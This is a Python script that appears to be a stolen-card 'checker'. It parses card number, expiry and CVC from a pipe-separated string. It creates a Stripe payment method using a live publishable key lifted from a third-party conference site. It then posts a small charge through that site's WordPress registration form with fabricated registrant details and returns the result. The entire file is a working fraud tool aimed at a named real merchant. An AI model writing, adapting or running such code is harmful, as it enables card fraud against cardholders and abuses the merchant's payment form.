import requests,re
def Tele(ccx):
	import requests
	ccx=ccx.strip()
	n = ccx.split("|")[0]
	mm = ccx.split("|")[1]
	yy = ccx.split("|")[2]
	cvc = ccx.split("|")[3]
	if "20" in yy:#Mo3gza
		yy = yy.split("20")[1]
	r = requests.session()

	headers = {
	    'authority': 'api.stripe.com',
	    'accept': 'application/json',
	    'accept-language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
	    'content-type': 'application/x-www-form-urlencoded',
	    'origin': 'https://js.stripe.com',
	    'referer': 'https://js.stripe.com/',
	    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-site',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
	}
	
	data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&payment_user_agent=stripe.js%2F4901af2b6b%3B+stripe-js-v3%2F4901af2b6b%3B+card-element&key=pk_live_51JUSsdLKcbiWYA2XlcI7cM8QwlOlTxhQz7CfoQZVR8EnFzSQGzCagg9Ox7JwOG0edKEiJf4xH47GI5A6gq9m1qo500bgDe2Jtl'
	
	r1 = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
	
	pm = r1.json()['id']
	
	cookies = {
	    '_gid': 'GA1.2.428777829.1744539054',
	    '_ga_4MZY34CRTP': 'GS1.1.1744539054.1.0.1744539054.0.0.0',
	    '_ga': 'GA1.1.264961307.1744539054',
	    '__stripe_mid': 'edc12a34-a5fe-41f7-8a09-b2822039c714bb49b0',
	    '__stripe_sid': 'fe0769ae-fcbb-44f5-900d-f132b60bb11a521a8f',
	}
	
	headers = {
	    'authority': 'dubaicme.com',
	    'accept': '*/*',
	    'accept-language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
	    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
	    # 'cookie': '_gid=GA1.2.428777829.1744539054; _ga_4MZY34CRTP=GS1.1.1744539054.1.0.1744539054.0.0.0; _ga=GA1.1.264961307.1744539054; __stripe_mid=edc12a34-a5fe-41f7-8a09-b2822039c714bb49b0; __stripe_sid=fe0769ae-fcbb-44f5-900d-f132b60bb11a521a8f',
	    'origin': 'https://dubaicme.com',
	    'referer': 'https://dubaicme.com/ws-ehs2025/',
	    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-origin',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
	    'x-requested-with': 'XMLHttpRequest',
	}
	
	params = {
	    't': '1744539195459',
	}
	
	data = {
	    'data': '__fluent_form_embded_post_id=32383&_fluentform_81_fluentformnonce=520e088348&_wp_http_referer=%2Fws-ehs2025%2F&input_radio_2=Student%20&Registration_fee=300&dropdown=prof&input_text=Rodam%20User&email=rodamuser08%40gmail.com&phone_1=%2B16046438137&country-list=US&input_text_1=Help&input_text_3=NY&dropdown_1=Dubai&input_radio_1=Ultrasound%20Workshop%0D%0A&custom-payment-amount=2.00&payment_method=stripe&item__81__fluent_checkme_=&__stripe_payment_method_id='+str(pm)+'',
	    'action': 'fluentform_submit',
	    'form_id': '81',
	}
	
	r2 = requests.post('https://dubaicme.com/wp-admin/admin-ajax.php', params=params, cookies=cookies, headers=headers, data=data)
	
	return (r2.json())
